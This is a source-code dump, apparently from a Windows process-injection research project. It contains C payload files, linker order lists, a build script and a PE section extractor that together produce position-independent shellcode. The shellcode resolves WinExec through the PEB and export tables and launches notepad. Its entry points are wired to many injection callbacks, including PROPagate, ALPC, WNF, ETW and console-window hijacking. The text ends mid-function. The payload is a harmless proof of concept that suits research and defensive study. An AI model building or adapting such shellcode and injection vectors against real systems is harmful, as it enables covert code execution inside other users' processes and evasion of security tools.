HyphenateProc
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/order.txt`:

```txt
entrypoint
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/payload.c`:

```c
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../../NTlib//nttpp.h"

#include <evntrace.h>
#include <pla.h>
#include <wbemidl.h>
#include <wmistr.h>
#include <Evntcons.h>

typedef UINT (WINAPI *WinExec_t)(
  _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char*,char*);

#ifdef WINDOW        // Extra Window Bytes
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, 
  WPARAM wParam, LPARAM lParam)
#endif
  
#ifdef SVCCTRL       // Service Control Handler
DWORD Handler(DWORD dwControl)
#endif

#ifdef SUBCLASS      // PROPagate
LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, 
  LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
#endif

#ifdef WORDBREAK     // WordWarping
int Editwordbreakproca(LPSTR lpch, int ichCurrent, int cch, int code)
#endif

#ifdef HYPHENATE     // Hyphentension
void HyphenateProc(WCHAR *pszWord, LANGID langid, long ichExceed, 
  HYPHRESULT *phyphresult)
#endif

#ifdef AUTOCORRECT   // AutoCourgette
int Autocorrectproc(LANGID langid, const WCHAR *pszBefore, 
  WCHAR *pszAfter, LONG cchAfter, LONG *pcchReplaced)
#endif

#ifdef STREAM        // Streamception
DWORD Editstreamcallback(DWORD_PTR dwCookie, LPBYTE pbBuff,
  LONG cb, LONG *pcb)
#endif

#ifdef CLIPBOARD     // IRichEditOle::GetClipboardData method
HRESULT OleGetClipboardData(CHARRANGE *lpchrg, DWORD reco, LPDATAOBJECT *lplpdataobj)
#endif

#ifdef LVCOMPARE     // ListPlanting
int Pfnlvgroupcompare(int Arg1, int Arg2, void *ptr)
#endif

#ifdef TVCOMPARE     // TreePoline / TVSORTCB structure
int CALLBACK TvCompareFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
#endif

#ifdef CONSOLE       // ConsoleWindowClass
HWND GetWindowHandle(VOID)
#endif

#ifdef RELEASE       // Release method
VOID Release(VOID *This)
#endif

#ifdef QUERYINTERFACE
VOID QueryInterface(REFIID riid, void **ppvObject)
#endif

#ifdef ALPC          // Advanced Local Procedure Call (ALPC)
VOID TpAlpcCallBack(PTP_CALLBACK_INSTANCE Instance, 
  LPVOID Context, PTP_ALPC TpAlpc, LPVOID Reserved) 
#endif

#ifdef WINSOCK
INT WSHGetSocketInformation(
    PVOID  HelperDllSocketContext,
    SOCKET SocketHandle,
    HANDLE TdiAddressObjectHandle,
    HANDLE TdiConnectionObjectHandle,
    INT    Level,
    INT    OptionName,
    PCHAR  OptionValue,
    INT    OptionLength)
#endif

#ifdef CTRL
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
#endif

#ifdef DDE
HDDEDATA DDECallback(
  UINT wType,
  UINT wFmt,
  HCONV hConv,
  HSZ hsz1,
  HSZ hsz2,
  HDDEDATA hData,
  ULONG_PTR dwData1,
  ULONG_PTR dwData2)
#endif

#ifdef WNF
typedef struct _WNF_STATE_NAME {
    ULONG                             Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef const struct _WNF_STATE_NAME* PCWNF_STATE_NAME;

typedef struct _WNF_TYPE_ID {
    GUID                              TypeId;
} WNF_TYPE_ID, *PWNF_TYPE_ID;

typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;

typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

NTSTATUS WnfCallback (
    WNF_STATE_NAME                    StateName,
    WNF_CHANGE_STAMP                  ChangeStamp,
    PWNF_TYPE_ID                      TypeId,
    PVOID                             CallbackContext,
    PVOID                             Buffer,
    ULONG                             BufferSize)
#endif

#ifdef ETW
void WINAPI EtwEnableCallback (
  LPCGUID                  SourceId,
  ULONG                    IsEnabled,
  UCHAR                    Level,
  ULONGLONG                MatchAnyKeyword,
  ULONGLONG                MatchAllKeyword,
  PEVENT_FILTER_DESCRIPTOR FilterData,
  PVOID                    CallbackContext)
#endif

{
    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szNotepad[3];

    #ifdef ALPC
      PTP_ALPC_CALLBACK  pLrpcIoComplete;
      TP_SIMPLE_CALLBACK *tp=(TP_SIMPLE_CALLBACK*)Context;
      // Context should contain pointer to original callback structure
      pLrpcIoComplete = (PTP_ALPC_CALLBACK)tp->Function;
      // restore original values
      // this will indicate we executed ok,
      // but is also required before the call to WinExec
      TpAlpc->CallbackObject.Callback.Function = tp->Function;
      TpAlpc->CallbackObject.Callback.Context  = tp->Context;
    #endif
    
    // now call WinExec to start notepad
    szWinExec[0] = *(DWORD*)"WinE";
    szWinExec[1] = *(DWORD*)"xec\0";
    
    szNotepad[0] = *(DWORD*)"note";
    szNotepad[1] = *(DWORD*)"pad\0";

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szNotepad, SW_SHOW);
    }
    
    // if this is ALPC, pass the original message on..
    #ifdef ALPC 
      pLrpcIoComplete(Instance, TpAlpc->CallbackObject.Callback.Context, TpAlpc, Reserved);
    #endif
    
    // for EM_STREAMIN, indicate an error.
    #if defined(STREAM)
      return (DWORD)~0UL;
    #endif
    
    #if defined(CTRL)
      return TRUE;
    #endif
    
    #if !defined(ETW) && !defined(ALPC) && !defined(HYPHENATE) && !defined(RELEASE) && !defined(QUERYINTERFACE)
      return 0;
    #endif
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
    dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
    rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // if no export table, return NULL
    if (rva==0) return NULL;
    
    exp = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, base, rva);
    cnt = exp->NumberOfNames;
    
    // if no api names, return NULL
    if (cnt==0) return NULL;
    
    adr = RVA2VA(PDWORD,base, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD,base, exp->AddressOfNames);
    ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
    dll = RVA2VA(PCHAR, base, exp->Name);
    
    do {
      // calculate hash of api string
      api = RVA2VA(PCHAR, base, sym[cnt-1]);
      // add to DLL hash and compare
      if (!xstrcmp(pszAPI, api)){
        // return address of function
        api_adr = RVA2VA(LPVOID, base, adr[ord[cnt-1]]);
        return api_adr;
      }
    } while (--cnt && api_adr==0);
    return api_adr;
}

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI) {
    PPEB                  peb;
    PPEB_LDR_DATA         ldr;
    PLDR_DATA_TABLE_ENTRY dte;
    LPVOID                api_adr=NULL;
    
  #if defined(_WIN64)
    peb = (PPEB) __readgsqword(0x60);
  #else
    peb = (PPEB) __readfsdword(0x30);
  #endif

    ldr = (PPEB_LDR_DATA)peb->Ldr;
    
    // for each DLL loaded
    for (dte=(PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
         dte->DllBase != NULL && api_adr == NULL; 
         dte=(PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
    {
      // search the export table for api
      api_adr=FindExport(dte->DllBase, (PCHAR)pszAPI);  
    }
    return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2){
    while(*s1 && (*s1==*s2))s1++,s2++;
    return (int)*(unsigned char*)s1 - *(unsigned char*)s2;
}

```

`payload/x64/propagate.txt`:

```txt
SubclassProc
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/release.txt`:

```txt
Release
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/streamception.txt`:

```txt
Editstreamcallback
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/svcctrl.txt`:

```txt
Handler
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/treeview.txt`:

```txt
TvCompareFunc
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/winsock.txt`:

```txt
WSHGetSocketInformation
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/wnf.txt`:

```txt
WnfCallback
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/wordwarping.txt`:

```txt
Editwordbreakproca
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/xbin.cpp`:

```cpp
/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <windows.h>

#pragma comment (lib, "user32.lib")

PBYTE img=NULL;
ULONGLONG img_base;
HANDLE hFile, hMap;
LPBYTE lpAddress;
DWORD cpu_arch, flags;

// return pointer to DOS header
PIMAGE_DOS_HEADER DosHdr (void) {
  return (PIMAGE_DOS_HEADER)lpAddress;
}

// return pointer to NT header
PIMAGE_NT_HEADERS NtHdr (void) {
  return (PIMAGE_NT_HEADERS) (lpAddress + DosHdr()->e_lfanew);
}

// return pointer to File header
PIMAGE_FILE_HEADER FileHdr (void) {
  return &NtHdr()->FileHeader;
}

// determines CPU architecture of binary
BOOL is32 (void) {
  return FileHdr()->Machine==IMAGE_FILE_MACHINE_I386;
}

// determines CPU architecture of binary
BOOL is64 (void) {
  return FileHdr()->Machine==IMAGE_FILE_MACHINE_AMD64;
}

// return pointer to Optional header
LPVOID OptHdr (void) {
  return (LPVOID)&NtHdr()->OptionalHeader;
}

// return pointer to first section header
PIMAGE_SECTION_HEADER SecHdr (void)
{
  PIMAGE_NT_HEADERS nt=NtHdr();
  
  return (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
  nt->FileHeader.SizeOfOptionalHeader);
}

DWORD DirSize (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->NumberOfRvaAndSizes;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->NumberOfRvaAndSizes;
  }
}

DWORD SecSize (void)
{
  return NtHdr()->FileHeader.NumberOfSections;
}

PIMAGE_DATA_DIRECTORY Dirs (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->DataDirectory;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->DataDirectory;
  }
}

ULONGLONG ImgBase (void)
{
  if (is32()) {
    return ((PIMAGE_OPTIONAL_HEADER32)OptHdr())->ImageBase;
  } else {
    return ((PIMAGE_OPTIONAL_HEADER64)OptHdr())->ImageBase;
  }
}

// valid dos header?
int valid_dos_hdr (void)
{
  PIMAGE_DOS_HEADER dos=DosHdr();
  if (dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;
  return (dos->e_lfanew != 0);
}

// valid nt headers
int valid_nt_hdr (void)
{
  return NtHdr()->Signature==IMAGE_NT_SIGNATURE;
}

int isObj (void) {
  PIMAGE_DOS_HEADER dos=DosHdr();
  
  return ((dos->e_magic==IMAGE_FILE_MACHINE_AMD64 ||
  dos->e_magic==IMAGE_FILE_MACHINE_I386) && 
  dos->e_sp==0);
}

DWORD rva2ofs (DWORD rva) {
  int i;
  
  PIMAGE_SECTION_HEADER sec=SecHdr();
  
  for (i=0; i<SecSize(); i++) {
    if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].SizeOfRawData)
    return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
  }
  return -1;
}

void bin2file (char name[], BYTE bin[], DWORD len)
{
  char fname[MAX_PATH];
  
  wsprintf (name, "%s%i.bin", name, is32() ? 32 : 64);
  
  FILE *out=fopen (name, "wb");
  if (out!=NULL)
  {
    fwrite (bin, 1, len, out);
    fclose (out);
  }
}

void dump_section (char fname[], char section[])
{
  DWORD i, ofs;
  PIMAGE_SECTION_HEADER sec=SecHdr();
  PBYTE pRawData;
  
  for (i=0; i<SecSize(); i++) 
  {
    if (strcmp((char*)sec[i].Name, section)==0) {
      printf ("\nSECTION HEADER #%i\n", i+1);
      printf ("%8s name\n",            sec[i].Name);
      printf ("%8X virtual size\n",    sec[i].Misc.VirtualSize);
    
      if (is32())
      {
        printf ("%8X virtual address (%08X to %08X)\n",
        sec[i].VirtualAddress, 
        (DWORD)img_base + sec[i].VirtualAddress, 
        (DWORD)img_base + sec[i].Misc.VirtualSize - 1);      
      } else {
        printf ("%8X virtual address (%016llX to %016llX)\n",
        sec[i].VirtualAddress, 
        img_base + sec[i].VirtualAddress, 
        img_base + sec[i].Misc.VirtualSize);
      }
      printf ("%8X size of raw data (%i bytes padding)\n",
      sec[i].SizeOfRawData, 
      sec[i].SizeOfRawData - sec[i].Misc.VirtualSize - 1);
      
      printf ("%8X file pointer to raw data (%08X to %08X)\n", 
      sec[i].PointerToRawData, sec[i].PointerToRawData, 
      sec[i].PointerToRawData + sec[i].SizeOfRawData - 1);
      
      printf ("%8X file pointer to relocation table\n",   sec[i].PointerToRelocations);
      printf ("%8X file pointer to line numbers\n",       sec[i].PointerToLinenumbers);
      printf ("%8X number of relocations\n",              sec[i].NumberOfRelocations);
      printf ("%8X number of line numbers\n",             sec[i].NumberOfLinenumbers);
      printf ("%8X flags\n",                              sec[i].Characteristics);
      
      ofs=rva2ofs (sec[i].VirtualAddress);
      if (ofs != -1)
      {
        pRawData = (PBYTE) (lpAddress + ofs);
        
        bin2file (fname, pRawData, sec[i].Misc.VirtualSize);
        break;
      }
    }
  }
}

void dump_img (char name[], char section[])
{ 
  if (!valid_dos_hdr()) {
    printf ("  [ invalid dos header\n");
    return;
  }
  
  if (!valid_nt_hdr()) {
    printf ("  [ invalid nt header\n");
    return;
  }
  
  dump_section (name, section);
}

int open_img (char f[])
{ 
  int     r=0;
  
  hFile=CreateFile (f, GENERIC_READ, FILE_SHARE_READ, 
      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
  if (hFile!=INVALID_HANDLE_VALUE) {
    hMap=CreateFileMapping (hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap!=NULL) {
      lpAddress=(LPBYTE)MapViewOfFile (hMap, FILE_MAP_READ, 0, 0, 0);
      r=1;
    }
  }
  return r;
}

void close_img (void)
{
  if (lpAddress!=NULL) UnmapViewOfFile ((LPCVOID)lpAddress);
  if (hMap     !=NULL) CloseHandle (hMap);
  if (hFile    !=NULL) CloseHandle (hFile);
}

int main (int argc, char *argv[])
{
  if (argc != 3) {
    printf ("\n[ usage: xbin <exe> <section name>\n");
    return 0;
  }
  if (open_img(argv[1])) {
    if (isObj()) {
      printf ("\n[ Looks like an object file");
    } else {
      dump_img (argv[1], argv[2]);
    }
  }
  close_img();
  return 0;
}

```

`payload/x86/Conhost.txt`:

```txt
GetWindowHandle
FindExport
xGetProcAddress
xstrcmp

```

`payload/x86/build.bat`:

```bat
@echo off
cl -nologo -Os xbin.cpp
echo.
cl -DCONSOLE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@conhost.txt /entry:GetWindowHandle /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe32.bin ..\..\conhost\payload.bin
echo.
cl -DSUBCLASS -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@propagate.txt /entry:SubclassProc /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe32.bin ..\..\propagate\payload.bin
echo.
cl -DWINDOW -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@extrabytes.txt /entry:WndProc /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe32.bin ..\..\extrabytes\payload.bin
echo.
cl -DSVCCTRL -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@svcctrl.txt /entry:Handler /base:0 payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe32.bin ..\..\svcctrl\payload.bin
```

`payload/x86/extrabytes.txt`:

```txt
WndProc@16
FindExport
xGetProcAddress
xstrcmp
```

`payload/x86/getapi.h`:

```h
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#ifndef GETAPI_H
#define GETAPI_H

#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

typedef void *PPS_POST_PROCESS_INIT_ROUTINE;

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// PEB defined by rewolf
// http://blog.rewolf.pl/blog/?p=573
typedef struct _PEB_LDR_DATA {
  ULONG      Length;
  BOOL       Initialized;
  LPVOID     SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
  LIST_ENTRY     InLoadOrderLinks;
  LIST_ENTRY     InMemoryOrderLinks;
  LIST_ENTRY     InInitializationOrderLinks;
  LPVOID         DllBase;
  LPVOID         EntryPoint;
  ULONG          SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
  BYTE                         InheritedAddressSpace;
  BYTE                         ReadImageFileExecOptions;
  BYTE                         BeingDebugged;
  BYTE                         _SYSTEM_DEPENDENT_01;

  LPVOID                       Mutant;
  LPVOID                       ImageBaseAddress;

  PPEB_LDR_DATA                Ldr;
  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  LPVOID                       SubSystemData;
  LPVOID                       ProcessHeap;
  LPVOID                       FastPebLock;
  LPVOID                       _SYSTEM_DEPENDENT_02;
  LPVOID                       _SYSTEM_DEPENDENT_03;
  LPVOID                       _SYSTEM_DEPENDENT_04;
  union {
    LPVOID                     KernelCallbackTable;
    LPVOID                     UserSharedInfoPtr;
  };  
  DWORD                        SystemReserved;
  DWORD                        _SYSTEM_DEPENDENT_05;
  LPVOID                       _SYSTEM_DEPENDENT_06;
  LPVOID                       TlsExpansionCounter;
  LPVOID                       TlsBitmap;
  DWORD                        TlsBitmapBits[2];
  LPVOID                       ReadOnlySharedMemoryBase;
  LPVOID                       _SYSTEM_DEPENDENT_07;
  LPVOID                       ReadOnlyStaticServerData;
  LPVOID                       AnsiCodePageData;
  LPVOID                       OemCodePageData;
  LPVOID                       UnicodeCaseTableData;
  DWORD                        NumberOfProcessors;
  union
  {
    DWORD                      NtGlobalFlag;
    LPVOID                     dummy02;
  };
  LARGE_INTEGER                CriticalSectionTimeout;
  LPVOID                       HeapSegmentReserve;
  LPVOID                       HeapSegmentCommit;
  LPVOID                       HeapDeCommitTotalFreeThreshold;
  LPVOID                       HeapDeCommitFreeBlockThreshold;
  DWORD                        NumberOfHeaps;
  DWORD                        MaximumNumberOfHeaps;
  LPVOID                       ProcessHeaps;
  LPVOID                       GdiSharedHandleTable;
  LPVOID                       ProcessStarterHelper;
  LPVOID                       GdiDCAttributeList;
  LPVOID                       LoaderLock;
  DWORD                        OSMajorVersion;
  DWORD                        OSMinorVersion;
  WORD                         OSBuildNumber;
  WORD                         OSCSDVersion;
  DWORD                        OSPlatformId;
  DWORD                        ImageSubsystem;
  DWORD                        ImageSubsystemMajorVersion;
  LPVOID                       ImageSubsystemMinorVersion;
  union
  {
    LPVOID                     ImageProcessAffinityMask;
    LPVOID                     ActiveProcessAffinityMask;
  };
  #ifdef _WIN64
  LPVOID                       GdiHandleBuffer[64];
  #else
  LPVOID                       GdiHandleBuffer[32];
  #endif  
  LPVOID                       PostProcessInitRoutine;
  LPVOID                       TlsExpansionBitmap;
  DWORD                        TlsExpansionBitmapBits[32];
  LPVOID                       SessionId;
  ULARGE_INTEGER               AppCompatFlags;
  ULARGE_INTEGER               AppCompatFlagsUser;
  LPVOID                       pShimData;
  LPVOID                       AppCompatInfo;
  PUNICODE_STRING              CSDVersion;
  LPVOID                       ActivationContextData;
  LPVOID                       ProcessAssemblyStorageMap;
  LPVOID                       SystemDefaultActivationContextData;
  LPVOID                       SystemAssemblyStorageMap;
  LPVOID                       MinimumStackCommit;  
} PEB, *PPEB;

#endif
  
  
```

`payload/x86/payload.c`:

```c
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "getapi.h"
  
typedef UINT (WINAPI *WinExec_t)(
  _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char*,char*);

#ifdef WINDOW // Extra Window Bytes
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, 
  WPARAM wParam, LPARAM lParam)
#endif
  
#ifdef SVCCTRL // Service Control Handler
DWORD Handler(DWORD dwControl)
#endif

#ifdef SUBCLASS // PROPagate
LRESULT CALLBACK SubclassProc(HWND hWnd, UINT uMsg, WPARAM wParam, 
  LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData)
#endif

#ifdef CONSOLE // ConsoleWindowClass
HWND GetWindowHandle(VOID)
#endif
{
    WinExec_t pWinExec;
    DWORD     szWinExec[2],
              szNotepad[3];

    // WinExec
    szWinExec[0]=0x456E6957;
    szWinExec[1]=0x00636578;

    // runs notepad
    szNotepad[0] = *(DWORD*)"note";
    szNotepad[1] = *(DWORD*)"pad\0";

    pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
    
    if(pWinExec != NULL) {
      pWinExec((LPSTR)szNotepad, SW_SHOW);
    }
    return 0;
}

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI){
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_NT_HEADERS       nt;
    DWORD                   cnt, rva, dll_h;
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr;
    PDWORD                  sym;
    PWORD                   ord;
    PCHAR                   api, dll;
    LPVOID                  api_adr=NULL;
    
    dos = (PIMAGE_DOS_HEADER)base;
